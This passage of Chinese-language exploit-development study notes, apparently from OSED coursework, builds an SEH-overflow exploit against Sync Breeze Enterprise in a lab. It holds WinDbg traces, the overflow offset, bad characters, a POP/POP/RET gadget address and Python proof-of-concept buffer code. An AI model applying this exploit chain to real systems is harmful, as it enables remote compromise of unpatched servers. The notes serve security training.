77383b32 8b4c2408        mov     ecx,dword ptr [esp+8]
77383b36 8b542410        mov     edx,dword ptr [esp+10h]
77383b3a 8b4108          mov     eax,dword ptr [ecx+8]
77383b3d 8902            mov     dword ptr [edx],eax
```
> Tips Again:
> - EIP：目前執行位置
> - ESP：目前 Stack Pointer
> - EBP：常用來參照目前函式的 Stack Frame
> - ECX：在這次執行狀態中，保存了 0x41414141
> - EDX：保存了 0x77383B20，接著將這個位址反組譯，觀察指向的程式碼
>
> 沒有覆蓋 stack 上的任何資料（ESP 和 EBP 指向堆疊）。最後 EDX 指向 `ntdll !ExecuteHandler2` 函數內部的某個位置。控制了 pointer 仍然無法將執行流程重定向到我們的 buffer

Restart Sync Breeze\
在 ExecuteHandler2 中追蹤 Handler 呼叫過程\
bp Set Breakpoint 指定位置設定斷點
```dbg
(1544.16f0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=018efa1c ecx=018eff18 edx=018ef9d4 esi=018eff18 edi=018efb20
eip=00902a9d esp=018ef9a8 ebp=018efec8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00902a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????

0:008> bp ntdll!ExecuteHandler2

0:008> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=018ef4cc edx=770a3b20 esi=00000000 edi=00000000
eip=770a3adc esp=018ef45c ebp=018ef528 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!ExecuteHandler2:
770a3adc 55              push    ebp

0:008> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=018ef4cc edx=770a3b20 esi=00000000 edi=00000000
eip=770a3adc esp=018ef45c ebp=018ef528 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!ExecuteHandler2:
770a3adc 55              push    ebp
```
> ExecuteHandler2 會被呼叫兩次
> > 與前面看到的 SEH Chain 相呼應:
> > ```
> > 第一筆 Record：仍然有效
> > 第二筆 Record：遭到覆寫
> > ```


使用 u @eip L11 反組譯
```dbg
0:008> u @eip L11
ntdll!ExecuteHandler2:
770a3adc 55              push    ebp
770a3add 8bec            mov     ebp,esp
770a3adf ff750c          push    dword ptr [ebp+0Ch]
770a3ae2 52              push    edx
770a3ae3 64ff3500000000  push    dword ptr fs:[0]
770a3aea 64892500000000  mov     dword ptr fs:[0],esp
770a3af1 ff7514          push    dword ptr [ebp+14h]
770a3af4 ff7510          push    dword ptr [ebp+10h]
770a3af7 ff750c          push    dword ptr [ebp+0Ch]
770a3afa ff7508          push    dword ptr [ebp+8]
770a3afd 8b4d18          mov     ecx,dword ptr [ebp+18h]
770a3b00 ffd1            call    ecx
770a3b02 648b2500000000  mov     esp,dword ptr fs:[0]
770a3b09 648f0500000000  pop     dword ptr fs:[0]
770a3b10 8be5            mov     esp,ebp
770a3b12 5d              pop     ebp
770a3b13 c21400          ret     14h
```
> - `@eip`: 使用目前 EIP 暫存器的值作為起始位址
> - `L11`: 顯示 0x11 個指令長度單位 17 條指令
>
>```dbg
>mov ecx,dword ptr [ebp+18h]
>call ecx
>```
>第一條指令從記憶體取出一個值放進 ECX、第二條指令將 ECX 的值當作呼叫目標\
>若 ECX 是有效函式位址，CPU 就會呼叫該函式 \
>🥚 ECX 是 0x41414141，因此呼叫會嘗試跳轉到被覆寫的位址
>> 1. 建立目前函式的 Stack Frame
>> 2. 保存處理例外時需要的資訊。
>> 3. 暫時更新目前執行緒的 Exception List。
>> 4. 從 Stack Frame 取出 Handler 的位址。
>> 5. 使用 call ecx 呼叫該 Handler。
>> 6. Handler 返回後，還原例外處理所需的狀態

利用 SEH Overflow 影響執行流程，讓 EIP 受輸入資料控制
```
Buffer Overflow
       │
       ▼
覆寫 SEH Handler
       │
       ▼
程式發生 Access Violation
       │
       ▼
Windows 開始例外處理
       │
       ▼
ExecuteHandler2 取得 Handler 位址
       │
       ▼
ECX = 0x41414141
       │
       ▼
call ecx
       │
       ▼
執行流程嘗試前往 0x41414141
```
EIP 已經被控制，需要讓 CPU 回到我們可以控制的 Buffer

#### Gaining Code Execution
一般 Stack Overflow 函式返回時，CPU 會使用 Return Address 決定接下來的執行位置。但 SEH Overflow 的控制流程是由例外處理機制觸發，所以，即使我們成功覆寫 Handler，也不能直接假設 ESP 指向 Buffer。

當獲得 instruction pointer 的控制權時，無法控制 stack
```dbg
0:007> r
eax=00000000 ebx=00000000 ecx=41414141 edx=77f16b30 esi=00000000 edi=00000000
eip=77f16b10 esp=013ff33c ebp=013ff358 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!ExecuteHandler2+0x24:
77f16b10 ffd1            call    ecx {41414141}

0:007> dds esp L6
013ff33c  013ff440
013ff340  013fff54
013ff344  013ff45c
013ff348  013ff3cc
013ff34c  013ffe1c
013ff350  77f16b30 ntdll!ExecuteHandler2+0x44
```
> CPU 即將呼叫 0x41414141，但目前 ESP 是 0x013FF33C 不是我們輸入資料的起始位址
> - `dds esp L6`: 檢查 ESP 所指向的 Stack 內容
> 這些值是目前例外處理函式使用的 Stack 資料。Not shellcode

👉🏻 控制 EIP 和控制 Stack 是兩個不同的問題

`_except_handler` 的四個參數
```cpp
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,
    IN OUT PCONTEXT ContextRecord, 
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
); 
```
其中 EstablisherFrame 與目前被處理的 Exception Registration Record 所在的 Stack Frame 有關。\
這個參數指向的位址落在我們可以控制的 Stack 資料區域\
代表即使目前 ESP 指向 ExecuteHandler2 的 Stack Frame，Handler 的參數中仍然可能保留指向原始溢位資料的位址

使用 windbg 檢查 EstablisherFrame (_EXCEPTION_REGISTRATION_RECORD structure)
```dbg
0:007> dt _EXCEPTION_REGISTRATION_RECORD 013fff54
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141
   
0:007> dd 013fff54
013fff54  41414141 41414141 41414141 41414141
013fff64  41414141 41414141 41414141 41414141
013fff74  41414141 41414141 41414141 41414141
013fff84  41414141 41414141 41414141 41414141
013fff94  41414141 41414141 41414141 41414141
013fffa4  41414141 41414141 41414141 41414141
013fffb4  41414141 41414141 41414141 41414141
013fffc4  41414141 41414141 41414141 41414141
```
> EstablisherFrame 指向的記憶體區域確實受到輸入資料控制
> - 當前 ESP 不一定指向原始 Buffer
> - 但例外處理函式的參數可能包含指向原始 Buffer 的指標
> - 仍然可以研究如何從目前的執行位置回到受控的記憶體區域

>[!Important]
>SEH Overflow 中最常見的 common sequence 是 `POP R32, POP R32, RET`，將返回位址和 ExceptionRecord 參數從堆疊中彈出到兩個任意暫存器 (R32) 中，然後執行 RET 操作返回EstablisherFrame。

在尋找 POP、POP、RET (P/P/R) instruction sequence 前，先找出覆寫 Handler 的精確 Offset\
利用 msf-pattern_create 產生 unique pattern
```
┌──(chw💲CHW)-[~]
└─$ msf-pattern_create -l 1000
[2026-10-26 07:02:49] msf-pattern_create -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

將 inputBuffer 改成 unique pattern\
![image](https://hackmd.io/_uploads/rJkamnnnMl.png)

重新執行 PoC 觸發 access violation，觀察 SEH 被覆寫的情況
```
┌──(chw💲CHW)-[~/Offsec/OSED/StackOverflow]
└─$ python3 seh_overflow_0x02.py 192.168.120.10
Sending evil buffer...
Done!
```
Windbg: 用 !exchain 觀察 Pattern
```dbg
(1254.c78): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll - 
eax=63413163 ebx=0155fa1c ecx=0155ff18 edx=0155f9d4 esi=0155ff18 edi=0155fb20
eip=00582a9d esp=0155f9a8 ebp=0155fec8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00582a9d ff5024          call    dword ptr [eax+24h]  ds:0023:63413187=????????

0:009> !exchain
0155fe1c: libpal!md5_starts+149fb (005fdf5b)
0155ff54: 33654132
Invalid exception stack at 65413165
```
> 第一筆 Record 仍然有效\
> 第二筆 Record 的 Handler 已經被 Pattern 覆寫
> - `0x33654132` 是被覆寫欄位中的資料

確認 Offset 位置
```
┌──(chw💲CHW)-[~/Offsec/OSED/StackOverflow]
└─$ msf-pattern_offset -l 1000 -q 33654132
[2026-10-26 07:11:34] msf-pattern_offset -l 1000 -q 33654132
[*] Exact match at offset 128
```
Pattern 工具在長度 1000 的 Pattern 中，找到與指定值相符的位置，並回報 Offset 為 128\
Offset 是從輸入 Buffer 的起始位置開始計算的 byte 偏移量

因此可以更新 PoC code，使用 A、B、C 區分確認 Offset
```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 128
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
```
![image](https://hackmd.io/_uploads/Hkoprh32Me.png)

```dbg
(db4.7b8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll - 
eax=41414141 ebx=013afa1c ecx=013aff18 edx=013af9d4 esi=013aff18 edi=013afb20
eip=00582a9d esp=013af9a8 ebp=013afec8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
libpal!SCA_ConfigObj::Deserialize+0x1d:
00582a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????

0:007> !exchain
013afe1c: libpal!md5_starts+149fb (005fdf5b)
013aff54: 42424242
Invalid exception stack at 41414141
```
> Handler 欄位變成 0x42424242 四個 B

因此確認了先前找到的 Offset

### Detecting Bad Characters
與先前一樣避免 Bad Characters 截斷
```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
    b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
    b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
    b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
    b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
    b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
    b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
    b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
    b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
    b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
    b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
    b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
    b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
    b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
    b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
    b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
    b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
    b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

  inputBuffer = b"\x41" * 128
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= badchars
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
```
Windbg
```dbg
(180.c54): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll - 
eax=41414141 ebx=0132fa1c ecx=0132ff18 edx=0132f9d4 esi=0132ff18 edi=0132faa2
eip=00582a9d esp=0132f9a8 ebp=0132fec8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00582a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????

0:007> g
(180.c54): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=42424242 edx=77f16b30 esi=00000000 edi=00000000
eip=42424242 esp=0132f338 ebp=0132f358 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
42424242 ??              ???

0:007> dds esp L5
0132f338  77f16b12 ntdll!ExecuteHandler2+0x26
0132f33c  0132f440
0132f340  0132ff54
0132f344  0132f45c
0132f348  0132f3cc

0:007> db 0132ff54 
0132ff54  41 41 41 41 42 42 42 42-01 00 00 00 ec 07 5b 00  AAAABBBB......[.
0132ff64  10 3e 5b 00 28 73 a0 00-72 40 5b 00 58 cf 9f 00  .>[.(s..r@[.X...
...
```
> 在取得 EIP 控制後，執行 dds esp L5 檢查記憶體中的資料\
> EstablisherFrame 的指標可以從這次例外處理呼叫所使用的 Stack 參數中取得。⚠️ 參數在 Stack 上的位置取決於目前執行到哪個函式、函式的呼叫方式，以及該函式如何建立 Stack Frame。不能把某個固定的 ESP 偏移套用到所有函式\
> - `db 0132ff54`: 原本輸入中的 byte 序列沒有完整保留

不斷重複檢查，找出 Bad Characters
```hex
0x00, 0x02, 0x0A, 0x0D
```
![image](https://hackmd.io/_uploads/S1gpu2nhGx.png)


### Finding a P/P/R Instruction Sequence
[narly](https://code.google.com/archive/p/narly/) 是 WinDbg Extension，可以產生所有已載入模組及其各自保護機制的清單。
```dbg
0:007> .load narly
...
             by Nephi Johnson (d0c_s4vage)
                      N for gnarly!

Available commands:

    !nmod     - display /SafeSEH, /GS, DEP, and ASLR info for
                all loaded modules
```

載入後使用 `!nmod` 列出目前載入模組及其安全防護資訊
```dbg
0:007> !nmod
00330000 003e5000 libsync              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libsync.dll
00400000 00463000 syncbrs              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe
00570000 00644000 libpal               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
10000000 10226000 libspp               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
6cc70000 6cd09000 ODBC32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\ODBC32.dll
...
77d40000 77e74000 USER32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\USER32.dll
77e80000 77ffa000 ntdll                /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\ntdll.dll

*DEP/*ASLR means that these modules are compatible with ASLR/DEP
```
> 顯示 `/SafeSEH OFF` 代表這些模組沒有啟用 SafeSEH

![image](https://hackmd.io/_uploads/BkOd562hzx.png)

>[!Tip]
>繞過 SafeSEH protection  最常見的方法是未使用 /SAFESEH flag 的模組 leverage `POP R32、POP R32、RET` instruction sequence

👉🏻 libspp.dll應用程式 DLL 是一個選擇。在編譯時沒有任何保護措施，並且載入到不包含空位元組的記憶體區域

使用 lm m libspp 查看模組範圍
```dbg
0:007> lm m libspp
Browse full module list
start    end        module name
10000000 10226000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
```
> libspp.dll 的模組記憶體範圍: Start = 0x10000000 End   = 0x10226000\

理解 POP 與 RET 的 Opcode\
使用 msf-nasm_shell 來查看指令對應的機器碼

```
┌──(chw💲CHW)-[~/Offsec/OSED]
└─$ msf-nasm_shell
[2026-10-26 09:17:01] msf-nasm_shell
nasm > pop eax
00000000  58                pop eax

nasm > pop ebx
00000000  5B                pop ebx

nasm > pop ecx
00000000  59                pop ecx

nasm > pop edx
00000000  5A                pop edx

nasm > pop esi
00000000  5E                pop esi

nasm > pop edi
00000000  5F                pop edi

nasm > pop ebp
00000000  5D                pop ebp

nasm > ret
00000000  C3                ret
```

>[!Tip]
>WinDbg Script 的概念\
>使用 .wds 檔案，透過 WinDbg 的 Script 功能搜尋指令序列
>
>先理解腳本中幾個元素的角色：
>- `.block`：建立指令區塊
>- `.for`：執行迴圈
>- `$t0`、`$t1`：WinDbg 的 pseudo-register，可在腳本中保存臨時數值
>- `s`：搜尋記憶體
>- `-b`：指定以 byte 為單位搜尋
>- `-1`：只輸出符合條件的位址，而不顯示整段匹配內容

得知產生的指令操作碼是按順序排列的： 從 0x58 到 0x5F\
可以利用這一點，在腳本中 (find_ppr.wds) 創建所有可能的 POP R32 組合：
```wds
.block
{
	.for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
	{
		.for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
		{
			s-[1]b 10000000 10226000 $t0 $t1 c3
		}
	}
}
```
使用 WinDbg 中的 `$><` 指令
```dbg
0:007> $><C:\Users\offsec\Desktop\find_ppr.wds
0x1015a2f0
0x100087dd
0x10008808
0x1000881a
0x10008829
0x1001bb8a
0x1001bc1f
0x100491e4
...
```
選擇傳回的第一個位址 (0x1015a2f0)，並確認它指向一個 P/P/R instruction sequence
```dbg
0:009> u 1015a2f0 L3
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
1015a2f1 5b              pop     ebx
1015a2f2 c3              ret
```
> 位址確實對應到可辨識的指令，符合 P/P/R 形式

更新 PoC code
```python
...
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 128
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
...
```
PoC 重新觸發 access violation
```dbg
(184c.7dc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=018ffa1c ecx=018fff18 edx=018ff9d4 esi=018fff18 edi=018ffb20
eip=00922a9d esp=018ff9a8 ebp=018ffec8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
libpal!SCA_ConfigObj::Deserialize+0x1d:
00922a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????

0:008> !exchain
018ffe1c: libpal!md5_starts+149fb (0099df5b)
018fff54: libspp!pcre_exec+16460 (1015a2f0)
Invalid exception stack at 41414141

0:008> u 1015a2f0 L3
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
1015a2f1 5b              pop     ebx
1015a2f2 c3              ret
```
> Access violation 發生了存取違規。此時 EIP 仍然指向原本出錯的指令，並不會因為 SEH 欄位已經被覆寫，就在例外剛發生時立即變成 P/P/R 的位址\
> - `!exchain` 顯示目前 thread 的 x86 SEH chain 確認是 SEH 欄位的覆寫結果

使用 breakpoint 和單步執行
```dbg
0:008> bp 0x1015a2f0

0:008> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000
eip=1015a2f0 esp=018ff438 ebp=018ff458 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
```
> CPU 確實抵達位址，且目前的 EIP 指向第一條 POP 指令


逐步執行 POP 指令，檢查 return address
```dbg
0:008> r
eax=00000000 ebx=00000000 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000
eip=1015a2f0 esp=018ff438 ebp=018ff458 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax

0:008> t
eax=77383b02 ebx=00000000 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000
eip=1015a2f1 esp=018ff43c ebp=018ff458 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16461:
1015a2f1 5b              pop     ebx

0:008> t
eax=77383b02 ebx=018ff540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000
eip=1015a2f2 esp=018ff440 ebp=018ff458 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16462:
1015a2f2 c3              ret

0:008> dd poi(esp) L8
018fff54  41414141 1015a2f0 43434343 43434343
018fff64  43434343 43434343 43434343 43434343

0:008> t
eax=77383b02 ebx=018ff540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000
eip=018fff54 esp=018ff444 ebp=018ff458 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
018fff54 41              inc     ecx
```
> - `dd poi(esp) L8`: 檢查 RET 即將使用的值\
> 先取出 ESP 指向的 DWORD 值，再把這個值當成要顯示的記憶體位址。因此輸出顯示的是從 0x018fff54 開始的記憶體內容
>    - 0x018fff54 是這次 dump 開始顯示的記憶體位址。
>    - 0x41414141 是存放在 0x018fff54 的資料。
>    - 0x018fff54 才是接下來 RET 返回到的位址

### Island-Hopping in Assembly
Island-hopping 可以理解為：當執行流程無法直接抵達最終目標時，利用一系列短小的指令，把執行流程從目前位置逐步移到另一個位置

跳回堆疊後會看到奇怪的指令
```dbg
0:008> u eip L8
018fff54 41              inc     ecx
018fff55 41              inc     ecx
018fff56 41              inc     ecx
018fff57 41              inc     ecx
018fff58 f0a215104343    lock mov byte ptr ds:[43431015h],al
018fff5e 43              inc     ebx
018fff5f 43              inc     ebx
018fff60 43              inc     ebx
0:008> dd 0x43431015 L4
43431015  ???????? ???????? ???????? ????????
```
> - `u`：反組譯
> - `eip`：以目前指令指標所在的位置作為反組譯起點。
> - `L8`：顯示八條指令
>> - ⁉️ `lock mov f0a215104343`: 
>> 反組譯成 [lock mov byte](https://c9x.me/x86/html/file_module_x86_id_159.html) ptr ds:[43431015h], al
>> - `F0` 是 LOCK 前綴
>> - `A2` 對應 MOV 的一種形式
>> - 後續位元組提供目的位址
>> - `AL` 是 EAX 的低 8 位元
>>
>> LOCK 前綴用於某些支援鎖定語意的記憶體操作，不能任意加在所有指令前面。這裡形成的指令組合不符合有效的 LOCK 使用條件，因此執行時會產生無效鎖定序列相關的例外。

👉🏻 也說明為什麼不能只看見 EIP 已經指向堆疊，就認為後續執行一定正常。堆疊上的位元組若被解讀成無效或不合預期的指令，仍可能讓程式再次出錯


>[!Tip]
>在 x86 環境中，位元組 `0x41` 可被解讀為 `INC ECX`\
>因此若記憶體中有連續的 0x41，而 CPU 開始從該位置執行，這些位元組就可能被解讀成連續的 INC ECX 指令

#### 理解 NSEH 與 SEH 的相對位置
利用例外處理記錄中的 Next 欄位位置，理解返回到堆疊後，CPU 會先讀到哪些位元組

在 x86 範例中，_EXCEPTION_REGISTRATION_RECORD 的排列順序是：
```
+--------------------+
| Next               |
+--------------------+
| Handler            |
+--------------------+
```
每個欄位在 32 位元環境中佔 4 位元組\
將覆寫 Next 欄位的資料稱為 Next structure exception handler (NSEH)，將覆寫 Handler 欄位的資料稱為 SEH
```
較低位址
    |
    v
+--------------------+
| NSEH / Next        | 4 bytes
+--------------------+
| SEH / Handler      | 4 bytes
+--------------------+
| 後續輸入資料       |
+--------------------+
較高位址
```
先研究 P/P/R，再研究 short jump 指令：P/P/R 執行完之後，CPU 的返回位置會受到當前堆疊內容影響，而 NSEH、SEH 與後續資料在記憶體中的相對位置，決定了後面可以觀察到什麼

>[!Note]
>short jump:
>短跳是一種相對跳躍指令：它的跳躍目標由指令本身的位置和一個相對偏移共同決定\
>第一個 opcode 是: `0xEB`\
>第二個位元組是 relative offset 相對偏移
>```asm
>jmp short target
>```
>CPU 會根據這個相對偏移計算目標位置
>> 只要相對距離不變，這種跳躍指令就不必因為整段資料搬到另一個記憶體位置，而重新指定一個完整的絕對位址
>>  正向短跳範圍是：
>> - 0x00 到 0x7F：正向偏移。
>> - 0x80 到 0xFF：以有號 8 位元數值解讀時，代表負向偏移。
關鍵： "第二個位元組不是一個完整的絕對位址，而是相對於短跳指令後方位置的偏移"

指令 [a](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/a--assemble-) 可以把輸入的組合語言指令轉換成機器碼，寫入指定的記憶體位置
```dbg
0:008> r
eax=77383b02 ebx=018ff540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000
eip=018fff54 esp=018ff444 ebp=018ff458 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
018fff54 41              inc     ecx

0:008> dds eip L4
018fff54  41414141
018fff58  1015a2f0 libspp!pcre_exec+0x16460
018fff5c  43434343
018fff60  43434343

0:008> a
018fff54 jmp 0x018fff5c
jmp 0x018fff5c
018fff56 

0:008> u eip L1
018fff54 eb06            jmp     018fff5c
```
> `a`, `018fff54 jmp 0x018fff5c` (機器碼是：`EB 06`)
> ```
> 指令起始位置：018fff54
> 指令長度：    2 bytes
> 指令結束後：  018fff56
> 跳躍目標：    018fff5c
> ```

將短跳的機器碼寫入 NSEH 所在的位置後 dds 觀察
- `d`：顯示記憶體
- `d`：搭配 s：將內容解讀成符號相關資訊
- `L4`：顯示四個 DWORD
```dbg
0:008> dds eip L4
018fff54  414106eb
018fff58  1015a2f0 libspp!pcre_exec+0x16460
018fff5c  43434343
```

